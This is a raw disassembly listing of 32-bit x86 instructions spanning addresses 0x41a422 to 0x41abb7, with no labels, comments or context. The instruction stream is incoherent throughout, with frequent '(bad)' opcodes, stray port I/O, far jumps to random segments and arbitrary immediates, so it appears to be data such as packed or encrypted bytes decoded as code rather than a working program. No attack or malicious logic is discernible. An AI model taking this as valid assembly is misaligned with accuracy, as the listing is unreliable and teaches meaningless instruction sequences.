  41a422:	sub    al,0xa9
  41a424:	jo     0x41a462
  41a426:	dec    ecx
  41a427:	sub    BYTE PTR [edx],bl
  41a429:	pop    eax
  41a42a:	cmp    ah,BYTE PTR [edx+0x40]
  41a42d:	in     eax,0x70
  41a42f:	or     BYTE PTR [eax+0x19],dl
  41a432:	cmp    eax,0x3c09dfae
  41a437:	push   ds
  41a438:	stos   DWORD PTR es:[edi],eax
  41a439:	(bad)  
  41a43a:	pop    edi
  41a43b:	xchg   ebp,eax
  41a43c:	dec    edi
  41a43d:	sbb    ch,BYTE PTR [edi]
  41a43f:	sub    dl,BYTE PTR [ebp+0xa]
  41a442:	sub    BYTE PTR [ebx],bh
  41a444:	jmp    0xc6bb:0xdb9dd84a
  41a44b:	push   esp
  41a44c:	repnz fsubr QWORD PTR [ecx]
  41a44f:	cmc    
  41a450:	push   ebx
  41a451:	xor    bh,BYTE PTR [ecx+eax*4+0x10]
  41a455:	out    dx,eax
  41a456:	xchg   edx,eax
  41a457:	shl    BYTE PTR [edi+0x4],1
  41a45a:	cdq    
  41a45b:	fist   DWORD PTR [esi]
  41a45d:	mov    eax,0x229365fe
  41a462:	leave  
  41a463:	fisub  WORD PTR [edi-0x40a8e3ce]
  41a469:	out    0x39,al
  41a46b:	pop    ebx
  41a46c:	mov    WORD PTR [eax+0x372c0a9c],es
  41a472:	xchg   ebp,eax
  41a473:	outs   dx,DWORD PTR ds:[esi]
  41a474:	cdq    
  41a475:	mov    edi,0xf970a985
  41a47a:	adc    edi,esi
  41a47c:	mov    bh,ch
  41a47e:	(bad)  
  41a480:	xchg   esi,eax
  41a481:	inc    ecx
  41a482:	call   0xd4b3:0x19f69a8e
  41a489:	mov    edx,0x987e3c6
  41a48e:	sub    dh,BYTE PTR [ebp+eax*1-0x56]
  41a492:	iret   
  41a493:	out    dx,al
  41a494:	sbb    edi,edx
  41a496:	leave  
  41a497:	pusha  
  41a498:	cmp    al,0x2d
  41a49a:	mov    ecx,0xa9b8860a
  41a49f:	repnz cli 
  41a4a1:	mov    al,ds:0xba034224
  41a4a6:	add    cl,0xbd
  41a4a9:	mov    eax,0xa3e440ef
  41a4ae:	push   0x1f
  41a4b0:	aad    0xf2
  41a4b2:	js     0x41a438
  41a4b4:	dec    edx
  41a4b5:	lea    esi,gs:[eax]
  41a4b8:	inc    edx
  41a4b9:	jb     0x41a43d
  41a4bb:	push   0x3a
  41a4bd:	dec    edi
  41a4be:	pop    ecx
  41a4bf:	sbb    al,0x29
  41a4c1:	or     ecx,eax
  41a4c3:	lahf   
  41a4c4:	enter  0x7df4,0xea
  41a4c8:	in     eax,0x97
  41a4ca:	dec    ecx
  41a4cb:	push   ds
  41a4cc:	cmp    eax,0xb0d3619b
  41a4d1:	push   eax
  41a4d2:	inc    edx
  41a4d3:	and    BYTE PTR [ebp+ebp*4+0x64],bl
  41a4d7:	pop    ds
  41a4d8:	push   ds
  41a4d9:	sub    dl,BYTE PTR [eax-0x5adc9547]
  41a4df:	in     al,dx
  41a4e0:	inc    esi
  41a4e1:	mov    esi,0x66097b09
  41a4e6:	ds jecxz 0x41a473
  41a4e9:	mov    eax,0x8f85476a
  41a4ee:	adc    DWORD PTR [eax],edi
  41a4f0:	inc    edx
  41a4f1:	push   eax
  41a4f2:	and    ebp,DWORD PTR [eax*2-0x7db3cd67]
  41a4f9:	arpl   WORD PTR [esi+0x0],bx
  41a4fc:	jne    0x41a559
  41a4fe:	mov    edx,0x14471c82
  41a503:	or     ah,BYTE PTR ds:0x44c1fff1
  41a509:	mov    ecx,esp
  41a50b:	xor    al,0xba
  41a50d:	adc    edx,DWORD PTR [ebp-0x3c56c1b6]
  41a513:	or     BYTE PTR [di],ch
  41a516:	ins    DWORD PTR es:[edi],dx
  41a517:	mov    ecx,0xdd00b00f
  41a51c:	mov    dl,0xcb
  41a51e:	and    DWORD PTR [ebx+0x78],esi
  41a521:	mov    ds:0x8c67f230,al
  41a526:	or     DWORD PTR [esi-0x43279a6f],esi
  41a52c:	or     cl,ah
  41a52e:	mov    edx,0x9528ecac
  41a533:	sub    al,0x53
  41a535:	test   eax,0x6ce508db
  41a53a:	and    ecx,DWORD PTR [ebx]
  41a53c:	jmp    0x3c7ec547
  41a541:	dec    eax
  41a542:	xchg   edx,eax
  41a543:	mov    eax,ds:0x70f4a2fa
  41a548:	mov    al,0x90
  41a54a:	jle    0x41a4da
  41a54c:	mov    esp,0x2a167d5e
  41a551:	pop    es
  41a552:	loope  0x41a5ba
  41a554:	mov    ecx,0x8a3905cc
  41a559:	sbb    edi,DWORD PTR [ecx-0x3b]
  41a55c:	in     al,0x24
  41a55e:	(bad)  
  41a55f:	lods   eax,DWORD PTR ds:[esi]
  41a560:	mov    dl,0x7f
  41a562:	sub    al,0x7a
  41a564:	or     BYTE PTR [ecx],bh
  41a566:	add    DWORD PTR [esi-0x69],ecx
  41a569:	(bad)  
  41a56a:	lods   al,BYTE PTR ds:[esi]
  41a56b:	mov    edx,0xf8cca3e9
  41a570:	jge    0x41a5b5
  41a572:	mov    edx,0x4fb9b3b2
  41a577:	jae    0x41a56c
  41a579:	shl    BYTE PTR [edi-0x5389ae8d],0xf7
  41a580:	mov    bl,0x70
  41a582:	inc    edx
  41a583:	and    al,0x7f
  41a585:	stos   DWORD PTR es:[edi],eax
  41a586:	mov    al,ds:0xc15fb84c
  41a58b:	je     0x41a5f9
  41a58d:	idiv   DWORD PTR [ebx+0x702c86a3]
  41a593:	jmp    0x41a594
  41a595:	sbb    eax,0x1034a8f4
  41a59a:	jp     0x41a5dc
  41a59c:	xor    eax,0x69ef69ed
  41a5a1:	xchg   ebp,edx
  41a5a3:	repnz repz and ebx,DWORD PTR [edx]
  41a5a7:	sbb    ecx,DWORD PTR [eax]
  41a5a9:	stos   DWORD PTR es:[edi],eax
  41a5aa:	enter  0x6c08,0xd6
  41a5ae:	(bad)
  41a5b1:	mov    ebp,0xf1ea3e50
  41a5b6:	inc    edx
  41a5b7:	sub    al,0x44
  41a5b9:	into   
  41a5ba:	jae    0x41a559
  41a5bc:	mov    eax,ds:0x6c9c36fe
  41a5c1:	popf   
  41a5c2:	stc    
  41a5c3:	imul   eax,DWORD PTR [ebp+ebp*1+0x10f20004],0x1fbb5d63
  41a5ce:	xor    ah,BYTE PTR [ebx-0x6a]
  41a5d1:	adc    edx,DWORD PTR [ebp-0x18]
  41a5d4:	jmp    0x41a641
  41a5d6:	dec    edi
  41a5d7:	mov    bh,cl
  41a5d9:	lods   al,BYTE PTR ds:[esi]
  41a5da:	push   edx
  41a5db:	push   ecx
  41a5dc:	mov    DWORD PTR [esi-0x51],ecx
  41a5df:	and    al,0xb8
  41a5e1:	xor    eax,0x453fcff4
  41a5e6:	push   ebx
  41a5e7:	inc    ebp
  41a5e8:	and    BYTE PTR [edi],0x8
  41a5eb:	xchg   ecx,eax
  41a5ec:	jns    0x41a5b0
  41a5ee:	lock pop ecx
  41a5f0:	lds    edx,FWORD PTR [edx+0x28ce580a]
  41a5f6:	jmp    0x41a57b
  41a5f8:	xchg   ebp,eax
  41a5f9:	or     DWORD PTR [ecx-0x425e861b],ecx
  41a5ff:	clc    
  41a600:	mov    esp,0xf5ebf2f8
  41a605:	mov    edx,0x8e4ae31
  41a60a:	daa    
  41a60b:	jp     0x41a64e
  41a60d:	xor    al,0x7a
  41a60f:	sbb    eax,0x4993510c
  41a614:	mov    al,0xeb
  41a616:	cdq    
  41a617:	fbstp  TBYTE PTR [ebx+esi*4-0x3dd5a1ac]
  41a61e:	and    edi,edx
  41a620:	leave  
  41a621:	in     al,dx
  41a622:	sti    
  41a623:	or     edx,DWORD PTR [ecx+0x2d]
  41a626:	aas    
  41a627:	mov    al,0xb
  41a629:	out    0xaa,eax
  41a62b:	cmp    edi,DWORD PTR [esi-0x45]
  41a62e:	outs   dx,DWORD PTR ds:[esi]
  41a62f:	rcl    BYTE PTR [esi+0x1a36bb03],0x82
  41a636:	mov    esp,0xb128d5cb
  41a63b:	add    BYTE PTR [eax-0x2a],0x9f
  41a63f:	mov    ds:0x210202c7,eax
  41a644:	(bad)  
  41a645:	fs in  eax,0xb7
  41a648:	push   edi
  41a649:	lea    ebp,[edi+0x79466651]
  41a64f:	jae    0x41a66f
  41a651:	out    dx,al
  41a652:	push   ds
  41a653:	mov    eax,0x46a334a5
  41a658:	dec    edx
  41a659:	out    dx,al
  41a65a:	mov    ch,0x51
  41a65c:	aaa    
  41a65d:	test   al,0x24
  41a65f:	sub    dl,BYTE PTR [eax]
  41a661:	lods   eax,DWORD PTR ds:[esi]
  41a662:	push   cs
  41a663:	mov    ch,0x52
  41a665:	repz sbb eax,0x3041e0ff
  41a66b:	cmp    eax,0x292eb454
  41a670:	(bad)  
  41a671:	imul   ebx,ecx,0x1d
  41a674:	adc    bl,BYTE PTR ds:0x45ba141d
  41a67a:	es call 0x262e7de6
  41a680:	cwde   
  41a681:	inc    edx
  41a682:	pop    edx
  41a683:	dec    ebp
  41a684:	push   edi
  41a685:	mov    cl,BYTE PTR [ebx+ebp*8-0x32]
  41a689:	and    DWORD PTR [eax+0x2f01604a],edi
  41a68f:	rcr    DWORD PTR [esi+0x40],1
  41a692:	mov    cl,0xdf
  41a694:	cwde   
  41a695:	cmp    eax,0xfcfb4017
  41a69a:	xchg   esi,eax
  41a69b:	dec    ebp
  41a69c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a69d:	je     0x41a6e3
  41a69f:	mov    edx,0x923b6bcf
  41a6a4:	pop    edi
  41a6a5:	cdq    
  41a6a6:	popa   
  41a6a7:	xchg   edi,eax
  41a6a8:	xchg   edi,eax
  41a6a9:	or     BYTE PTR [edx-0x640c79dd],al
  41a6af:	ror    BYTE PTR ds:[ebx+edx*8-0x620f282b],cl
  41a6b7:	xor    edi,ebp
  41a6b9:	sub    bh,ah
  41a6bb:	(bad)  
  41a6bd:	adc    DWORD PTR [ebx],eax
  41a6bf:	mov    WORD PTR [ebx-0x70308e70],ss
  41a6c5:	call   DWORD PTR [eax+eax*8+0x63ad7bd6]
  41a6cc:	inc    edx
  41a6cd:	cmp    dl,BYTE PTR gs:[edi-0x3116c3b]
  41a6d4:	(bad)  
  41a6d5:	mov    DWORD PTR ds:0xa3654a80,eax
  41a6db:	add    al,0x47
  41a6dd:	dec    edi
  41a6de:	mov    ch,0x5b
  41a6e0:	add    DWORD PTR [esi-0x40],0x4d
  41a6e4:	imul   ebp,ecx,0xc6e4a7b3
  41a6ea:	jp     0x41a6e9
  41a6ec:	loop   0x41a742
  41a6ee:	cmc    
  41a6ef:	(bad)  
  41a6f0:	xchg   esi,eax
  41a6f1:	pop    edx
  41a6f2:	inc    eax
  41a6f3:	or     eax,0x5561e313
  41a6f8:	sbb    BYTE PTR [edi],bl
  41a6fa:	mov    ebp,0x301a6234
  41a6ff:	(bad)  
  41a700:	hlt    
  41a701:	dec    ebp
  41a702:	shl    bl,cl
  41a704:	adc    eax,0x7a7fcd0d
  41a709:	aam    0x6a
  41a70b:	ret    0xac97
  41a70e:	xor    DWORD PTR [edx-0x1077f585],edx
  41a714:	leave  
  41a715:	inc    esp
  41a716:	cmc    
  41a717:	in     eax,0x8c
  41a719:	pop    ebx
  41a71a:	js     0x41a742
  41a71c:	je     0x41a6d2
  41a71e:	xchg   esi,eax
  41a71f:	cmp    BYTE PTR [ecx+0x56],bl
  41a722:	add    edi,DWORD PTR ds:0x25af0968
  41a728:	(bad)  
  41a729:	rcl    al,1
  41a72b:	dec    edx
  41a72c:	fild   WORD PTR [edi-0x31]
  41a72f:	loop   0x41a708
  41a731:	adc    al,0x8a
  41a733:	sbb    BYTE PTR [edx+edx*1+0x9],ah
  41a737:	dec    edi
  41a738:	dec    ebp
  41a739:	mov    ds:0x12fccf03,al
  41a73e:	ss sub ecx,ecx
  41a741:	sub    eax,0x10c306a0
  41a746:	mov    ebx,0xe3f4615f
  41a74b:	pop    edx
  41a74c:	mov    esi,0x729a0ba0
  41a751:	pop    edx
  41a752:	aaa    
  41a753:	mov    dl,0xd1
  41a755:	mov    al,0x5a
  41a757:	jno    0x41a78d
  41a759:	jae    0x41a7c2
  41a75b:	iret   
  41a75c:	and    DWORD PTR [edx+0x682a4188],0x294cc816
  41a766:	loope  0x41a6ef
  41a768:	jns    0x41a76b
  41a76a:	hlt    
  41a76b:	cwde   
  41a76c:	xor    bl,BYTE PTR [ebp+0x64]
  41a76f:	xchg   ecx,eax
  41a770:	dec    esp
  41a771:	or     BYTE PTR [eax+0x46],dh
  41a774:	addr16 jg 0x41a736
  41a777:	enter  0xebc2,0xf3
  41a77b:	(bad)  
  41a77c:	sbb    eax,0x64445370
  41a781:	jns    0x41a76e
  41a783:	imul   ecx,DWORD PTR [ebx-0x46],0xe
  41a787:	mov    bh,0x3f
  41a789:	icebp  
  41a78a:	xor    eax,0xa3af78b6
  41a78f:	addr16 pop edx
  41a791:	push   es
  41a792:	sub    BYTE PTR [eax],0xe3
  41a795:	sub    ecx,DWORD PTR ds:0x39d36472
  41a79b:	stos   DWORD PTR es:[edi],eax
  41a79c:	je     0x41a7ec
  41a79e:	leave  
  41a79f:	enter  0x7b42,0x6f
  41a7a3:	retf   0x9e0
  41a7a6:	cli    
  41a7a7:	mov    ebx,0xa63cbba1
  41a7ac:	std    
  41a7ad:	xor    ch,BYTE PTR [edi-0x2b17bb2f]
  41a7b3:	cmp    BYTE PTR [esi],ch
  41a7b5:	repnz xor bh,ah
  41a7b8:	jle    0x41a7fa
  41a7ba:	into   
  41a7bb:	push   ss
  41a7bc:	mov    ch,0x81
  41a7be:	jle    0x41a746
  41a7c0:	sub    dh,BYTE PTR [eax-0x13]
  41a7c3:	mov    bh,BYTE PTR [ebx+0x4c642e65]
  41a7c9:	sub    DWORD PTR [edi+0x66428eb7],edi
  41a7cf:	pushf  
  41a7d0:	data16 std 
  41a7d2:	cmp    bl,0xa3
  41a7d5:	xor    bl,dl
  41a7d7:	les    esi,FWORD PTR [edx-0x6f]
  41a7da:	lahf   
  41a7db:	cwde   
  41a7dc:	xlat   BYTE PTR ds:[ebx]
  41a7dd:	and    BYTE PTR [ecx-0x37e842f9],al
  41a7e3:	mov    BYTE PTR [edx+0x4f0af19d],ah
  41a7e9:	pop    ds
  41a7ea:	scas   al,BYTE PTR es:[edi]
  41a7eb:	push   ebp
  41a7ec:	imul   edi,ebp,0xd7e6ff32
  41a7f2:	call   0x6f45:0x5ba0d690
  41a7f9:	shl    BYTE PTR [ebp+0x38],cl
  41a7fc:	mov    al,ds:0xd0678511
  41a801:	fistp  WORD PTR [ebx-0x39b4862f]
  41a807:	pop    ebp
  41a808:	inc    esi
  41a809:	xor    eax,0xaa8afe01
  41a80e:	iret   
  41a80f:	xor    bh,BYTE PTR [esi]
  41a811:	imul   ebx,ebp,0xbd16819f
  41a817:	add    esp,DWORD PTR [eax+0x5c94554a]
  41a81d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a81e:	pop    ss
  41a81f:	sub    ecx,DWORD PTR [ebp+0x6d914f2b]
  41a825:	(bad)  
  41a826:	pop    ss
  41a827:	xchg   ecx,eax
  41a828:	idiv   edi
  41a82a:	xchg   bh,ah
  41a82c:	fst    DWORD PTR [edi-0x59]
  41a82f:	popa   
  41a830:	fs aaa 
  41a832:	or     dl,dh
  41a834:	sbb    eax,0xbc4b724d
  41a839:	push   esi
  41a83a:	jno    0x41a895
  41a83c:	xchg   esi,eax
  41a83d:	aam    0x7b
  41a83f:	fcmovne st,st(6)
  41a841:	loopne 0x41a7d5
  41a843:	adc    bh,BYTE PTR [edi+0x7e]
  41a846:	sub    DWORD PTR [edi+eax*4-0x105f223b],edx
  41a84d:	divps  xmm1,xmm2
  41a850:	dec    ebx
  41a851:	ins    DWORD PTR es:[edi],dx
  41a852:	lods   eax,DWORD PTR ds:[esi]
  41a853:	mov    eax,ds:0x1d3e995f
  41a858:	fist   WORD PTR [eax-0x4a]
  41a85b:	pop    ebx
  41a85c:	es ds pop ss
  41a85f:	fild   DWORD PTR [edx+0x2c31e923]
  41a865:	mov    bl,BYTE PTR ds:0x4968ff52
  41a86b:	and    DWORD PTR [ebx],eax
  41a86d:	stc    
  41a86e:	sbb    eax,DWORD PTR [esi]
  41a870:	push   ebp
  41a871:	lods   al,BYTE PTR es:[esi]
  41a873:	iret   
  41a874:	pusha  
  41a875:	mov    ecx,0xfa7c8b48
  41a87a:	mov    ebp,0xb5130360
  41a87f:	stos   DWORD PTR es:[edi],eax
  41a880:	ins    DWORD PTR es:[edi],dx
  41a881:	dec    esi
  41a882:	and    cl,BYTE PTR [ebx+0x80f025d]
  41a888:	dec    esp
  41a88a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a88b:	sub    dl,BYTE PTR [esi+0x260fe3fb]
  41a891:	adc    al,0xe6
  41a893:	jnp    0x41a8ce
  41a895:	sbb    eax,0x327616ce
  41a89a:	fst    DWORD PTR [ebp+0x3d]
  41a89d:	jmp    0x41a896
  41a89f:	push   es
  41a8a0:	retf   0x9530
  41a8a3:	out    0x21,al
  41a8a5:	lock inc edi
  41a8a7:	clc    
  41a8a8:	es push ecx
  41a8aa:	icebp  
  41a8ab:	sbb    cl,BYTE PTR [esi+0x2ff89de1]
  41a8b1:	hlt    
  41a8b2:	push   ss
  41a8b3:	sub    BYTE PTR [ebp-0x2],0x65
  41a8b7:	shl    DWORD PTR [ecx],1
  41a8b9:	(bad)  
  41a8ba:	daa    
  41a8bb:	sub    BYTE PTR [edx+edi*1-0x71],dh
  41a8bf:	dec    edx
  41a8c0:	ret    0xdd5d
  41a8c3:	(bad)  
  41a8c4:	mov    al,ds:0x20b270aa
  41a8c9:	mov    al,ds:0xfc2b7161
  41a8ce:	sbb    al,0x4a
  41a8d0:	jp     0x41a950
  41a8d2:	ror    DWORD PTR [eax+esi*8-0x2b],0x23
  41a8d7:	push   esp
  41a8d8:	outs   dx,DWORD PTR ds:[esi]
  41a8d9:	rcr    BYTE PTR [ecx+0x3],0x0
  41a8dd:	and    al,0xa8
  41a8df:	int3   
  41a8e0:	enter  0x450e,0xf4
  41a8e4:	add    edi,DWORD PTR [ebx+0x3e2f3114]
  41a8ea:	stos   DWORD PTR es:[edi],eax
  41a8eb:	cmp    eax,0x4de04ee1
  41a8f0:	int    0xe1
  41a8f2:	jl     0x41a92a
  41a8f4:	mov    BYTE PTR [ebx],bl
  41a8f6:	stos   DWORD PTR es:[edi],eax
  41a8f7:	mov    bl,0x10
  41a8f9:	hlt    
  41a8fa:	and    BYTE PTR [ebp+0x60],0x51
  41a8fe:	ins    BYTE PTR es:[edi],dx
  41a8ff:	ja     0x41a95f
  41a901:	or     ah,bl
  41a903:	pop    ds
  41a904:	and    eax,0xa2e0dc6f
  41a909:	push   ebp
  41a90a:	bound  edi,QWORD PTR [esi]
  41a90c:	repz xor eax,0x4f7fa985
  41a912:	aas    
  41a913:	mov    ds:0x3dbbb960,eax
  41a918:	jbe    0x41a8e3
  41a91a:	es loope 0x41a8e8
  41a91d:	(bad)  
  41a91f:	(bad)  
  41a920:	retf   0xd53e
  41a923:	and    al,0xe7
  41a925:	idiv   ebp
  41a927:	mov    dl,0xcf
  41a929:	and    edx,DWORD PTR [ecx]
  41a92b:	fwait
  41a92c:	imul   esi,ecx,0x86fb0fd5
  41a932:	adc    cl,BYTE PTR [edx]
  41a934:	in     eax,0xcc
  41a936:	call   0x5c96b5ee
  41a93b:	push   edi
  41a93c:	push   0x3054ac75
  41a941:	dec    esi
  41a942:	retf   0x418d
  41a945:	ja     0x41a8f8
  41a947:	cs inc ebp
  41a949:	mov    dh,BYTE PTR [ebx-0x17ec74af]
  41a94f:	loope  0x41a90b
  41a951:	push   ebx
  41a952:	inc    BYTE PTR [ebp+0x50]
  41a955:	xor    BYTE PTR [eax+ecx*8-0x554090bb],dl
  41a95c:	out    0x8e,eax
  41a95e:	fist   WORD PTR [ebp-0xf6bccbf]
  41a964:	mov    ds:0x3b990e6d,al
  41a969:	shl    DWORD PTR [edx],cl
  41a96b:	mov    eax,0x5f039b95
  41a970:	pop    esp
  41a971:	mov    ah,0xca
  41a973:	jle    0x41a9e4
  41a975:	sbb    bh,BYTE PTR [esi+0x3e]
  41a978:	scas   eax,DWORD PTR es:[edi]
  41a979:	test   eax,0x5ce283f4
  41a97e:	jb     0x41a91e
  41a980:	adc    al,0xea
  41a982:	mov    ch,0x2d
  41a984:	mov    eax,0x20ec88d3
  41a989:	dec    eax
  41a98a:	mov    ecx,0x75ab75ef
  41a98f:	imul   eax,DWORD PTR [esp+edi*8],0xeaa36aa
  41a996:	sub    DWORD PTR [ecx],edx
  41a998:	fiadd  DWORD PTR fs:[ecx]
  41a99b:	inc    edx
  41a99c:	(bad)  
  41a99d:	(bad)  
  41a99e:	into   
  41a99f:	(bad)  
  41a9a0:	out    dx,al
  41a9a1:	dec    edx
  41a9a2:	sub    dh,BYTE PTR [ebx+0x7c014e3]
  41a9a8:	int    0xa0
  41a9aa:	dec    eax
  41a9ab:	stos   DWORD PTR es:[edi],eax
  41a9ac:	lds    esi,FWORD PTR [eax-0x6522c295]
  41a9b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9b3:	loopne 0x41a969
  41a9b5:	push   0xfda00e49
  41a9ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9bb:	jns    0x41aa11
  41a9bd:	mov    ds:0x4b00854e,eax
  41a9c2:	inc    ecx
  41a9c3:	jge    0x41a9ab
  41a9c5:	add    al,0x2
  41a9c7:	pop    esp
  41a9c8:	push   ss
  41a9c9:	aas    
  41a9ca:	sahf   
  41a9cb:	lods   eax,DWORD PTR ds:[esi]
  41a9cc:	and    BYTE PTR [edx+0x2ad63e6b],dh
  41a9d2:	cmp    bl,BYTE PTR [ecx+0xbc32d9a]
  41a9d8:	mov    ecx,0xceb42aee
  41a9dd:	sahf   
  41a9de:	repz inc ecx
  41a9e0:	lock aam 0x4
  41a9e3:	mov    WORD PTR [ecx-0x54638e84],?
  41a9e9:	rcl    DWORD PTR [edi],cl
  41a9eb:	jnp    0x41a9e2
  41a9ed:	clc    
  41a9ee:	inc    ecx
  41a9ef:	xchg   ebp,eax
  41a9f0:	jg     0x41a9fd
  41a9f2:	add    al,0x30
  41a9f4:	into   
  41a9f5:	mov    BYTE PTR [ebx],dl
  41a9f7:	xor    al,0x34
  41a9f9:	rcl    DWORD PTR [eax-0x4497f764],cl
  41a9ff:	sbb    al,0x20
  41aa01:	push   0xffffffb1
  41aa03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa04:	mov    ecx,0x6852d840
  41aa09:	sbb    BYTE PTR [edi+0x50767e46],dl
  41aa0f:	aam    0x8e
  41aa11:	fidivr DWORD PTR [edx-0x15]
  41aa14:	cmp    DWORD PTR [ebx],0xffffffcb
  41aa17:	mov    esp,0x7bff1cd6
  41aa1c:	mov    dl,0x22
  41aa1e:	pop    eax
  41aa1f:	mov    eax,0x357c1ba8
  41aa24:	pop    ebp
  41aa25:	(bad)  
  41aa26:	stc    
  41aa27:	pop    eax
  41aa28:	dec    ebx
  41aa29:	imul   ebx,ebx,0x7
  41aa2c:	daa    
  41aa2d:	mov    cl,0xe4
  41aa2f:	jl     0x41aa29
  41aa31:	add    al,0x7e
  41aa33:	fist   DWORD PTR [esi]
  41aa35:	fst    DWORD PTR [ebx+0x4bdcc91c]
  41aa3b:	ins    DWORD PTR es:[edi],dx
  41aa3c:	dec    ebp
  41aa3d:	sub    eax,0x875c0742
  41aa42:	pop    ebx
  41aa43:	adc    cl,BYTE PTR [ebx+0x4a]
  41aa46:	les    ebp,FWORD PTR [edx-0x44]
  41aa49:	ins    DWORD PTR es:[edi],dx
  41aa4a:	push   0xffffffa0
  41aa4c:	mov    BYTE PTR [eax+0x691ab8e2],al
  41aa52:	sub    ah,BYTE PTR [eax+ebx*4]
  41aa55:	out    dx,eax
  41aa56:	xor    DWORD PTR [ecx+0x1031f1d0],ecx
  41aa5c:	push   esi
  41aa5d:	into   
  41aa5e:	sub    BYTE PTR es:[edx],dh
  41aa61:	pop    ecx
  41aa62:	sbb    al,0x5b
  41aa64:	lock into 
  41aa66:	je     0x41aa6c
  41aa68:	fbld   TBYTE PTR [esp+ecx*1+0x4662ad68]
  41aa6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa70:	and    al,0x2b
  41aa72:	cli    
  41aa73:	push   edi
  41aa74:	add    al,0x3b
  41aa76:	mov    al,0x56
  41aa78:	mov    edx,0x4f74e88
  41aa7d:	pop    ds
  41aa7e:	and    ebp,esp
  41aa80:	fsub   st(0),st
  41aa82:	jne    0x41aa0d
  41aa84:	jmp    0x977e:0x5bf7728a
  41aa8b:	test   BYTE PTR [ebx+0x34b3ed92],0x0
  41aa92:	and    DWORD PTR [eax-0x59],esi
  41aa95:	dec    eax
  41aa96:	call   0x2f45:0x9c84c0e6
  41aa9d:	xor    bh,BYTE PTR [esi+ebx*2-0x5c]
  41aaa1:	xchg   DWORD PTR [edx-0x46c9b01e],esi
  41aaa7:	cmp    ah,BYTE PTR [ebx]
  41aaa9:	pushf  
  41aaaa:	add    ebp,ebx
  41aaac:	jl     0x41aad6
  41aaae:	loop   0x41aa7c
  41aab0:	repz bound edx,QWORD PTR [edi]
  41aab3:	aaa    
  41aab4:	inc    ecx
  41aab5:	outs   dx,DWORD PTR ds:[esi]
  41aab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aab7:	ud1    eax,DWORD PTR [ecx]
  41aaba:	shr    DWORD PTR [ecx+0x790bcaeb],0x27
  41aac1:	adc    eax,0x8b683d7a
  41aac6:	repnz mov bh,0xd1
  41aac9:	adc    eax,DWORD PTR [edi-0x4b]
  41aacc:	jp     0x41ab3c
  41aace:	pusha  
  41aacf:	out    0x20,eax
  41aad1:	test   eax,0xb2da8b0f
  41aad6:	pop    ss
  41aad7:	not    ecx
  41aad9:	or     edi,DWORD PTR [ebx+esi*2]
  41aadc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aadd:	lds    edi,FWORD PTR [ebp+0x1ef70134]
  41aae3:	inc    ebp
  41aae4:	xchg   edx,eax
  41aae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aae6:	shr    BYTE PTR [ebx+edi*8+0x2c],cl
  41aaea:	test   eax,0x671cb3b1
  41aaef:	mov    eax,0xc829013c
  41aaf4:	cld    
  41aaf5:	pop    esp
  41aaf6:	inc    ebx
  41aaf7:	call   0x1bc2:0x598477fe
  41aafe:	sub    DWORD PTR [edi+0x70],eax
  41ab01:	pop    edi
  41ab02:	push   es
  41ab03:	ror    BYTE PTR [edi+0x19],1
  41ab06:	aam    0x2d
  41ab08:	push   esi
  41ab09:	repnz inc eax
  41ab0b:	jno    0x41ab3b
  41ab0d:	xchg   ebx,eax
  41ab0e:	aad    0xd1
  41ab10:	add    ebp,DWORD PTR [ebx]
  41ab12:	pop    ss
  41ab13:	(bad)  
  41ab14:	das    
  41ab15:	sub    esp,ebx
  41ab17:	mov    BYTE PTR [eax+edi*2+0x328fbc85],0x76
  41ab1f:	fbld   TBYTE PTR [ebp+0x70]
  41ab22:	sbb    al,0x8f
  41ab24:	ret    0x379c
  41ab27:	cli    
  41ab28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab29:	inc    edi
  41ab2a:	jno    0x41aadd
  41ab2c:	inc    esp
  41ab2d:	sahf   
  41ab2e:	xlat   BYTE PTR ds:[ebx]
  41ab2f:	dec    eax
  41ab30:	or     eax,0x535d6173
  41ab35:	stos   DWORD PTR es:[edi],eax
  41ab36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab37:	mov    esp,0x44a02070
  41ab3c:	(bad)  
  41ab3d:	xor    eax,0x646e3222
  41ab42:	in     al,dx
  41ab43:	cld    
  41ab44:	add    DWORD PTR [esi],0x9
  41ab47:	cdq    
  41ab48:	ficomp DWORD PTR [esi]
  41ab4a:	scas   al,BYTE PTR es:[edi]
  41ab4b:	es push edi
  41ab4d:	jne    0x41aaf5
  41ab4f:	or     BYTE PTR [eax-0x1034bf58],bh
  41ab55:	mov    ah,0x15
  41ab57:	pushf  
  41ab58:	pop    ss
  41ab59:	sub    ecx,DWORD PTR [ecx-0xf]
  41ab5c:	xor    al,0x93
  41ab5e:	enter  0xc972,0x1
  41ab62:	add    DWORD PTR [eax],esi
  41ab64:	imul   ebx,DWORD PTR [ebp+0x67b984fd],0xffffffb3
  41ab6b:	in     eax,0x1c
  41ab6d:	inc    ebp
  41ab6e:	push   ebp
  41ab6f:	sbb    DWORD PTR [edx-0x71],esi
  41ab72:	out    0xcf,eax
  41ab74:	cmc    
  41ab75:	sub    DWORD PTR [ecx-0x74799350],0xa5531e12
  41ab7f:	sub    bh,cl
  41ab81:	xlat   BYTE PTR ds:[ebx]
  41ab82:	or     esi,ebx
  41ab84:	mov    edx,0xfdf55ee8
  41ab89:	xchg   DWORD PTR [ebx-0x2511079a],esp
  41ab8f:	xchg   esi,eax
  41ab90:	pop    eax
  41ab91:	add    dl,dl
  41ab93:	jl     0x41ab56
  41ab95:	or     DWORD PTR [edx+edx*4-0x43],ecx
  41ab99:	sti    
  41ab9a:	es in  al,dx
  41ab9c:	std    
  41ab9d:	dec    esi
  41ab9e:	and    DWORD PTR [esi+eax*4],0x4c6d8d5a
  41aba5:	add    eax,0x6fb1237c
  41abaa:	neg    DWORD PTR [esi]
  41abac:	ins    DWORD PTR es:[edi],dx
  41abad:	sar    DWORD PTR [esi+0x63ffaf98],cl
  41abb3:	jmp    0x41abf5
  41abb5:	mov    ch,0x7b
  41abb7:	push   ds
